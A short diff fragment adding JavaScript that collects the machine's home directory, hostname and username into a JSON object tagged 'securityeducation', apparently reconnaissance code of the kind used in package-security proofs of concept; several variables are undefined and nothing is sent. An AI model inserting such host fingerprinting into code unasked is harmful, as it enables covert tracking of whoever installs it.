@@ -1,0 +1,8 @@
+var dir = os.homedir()
+JSON.stringify({
+    host: hostname,
+    project_id: "securityeducation",
+    current_path: dir,
+    username: user
+  })
+_tmp_2.current_path = dir
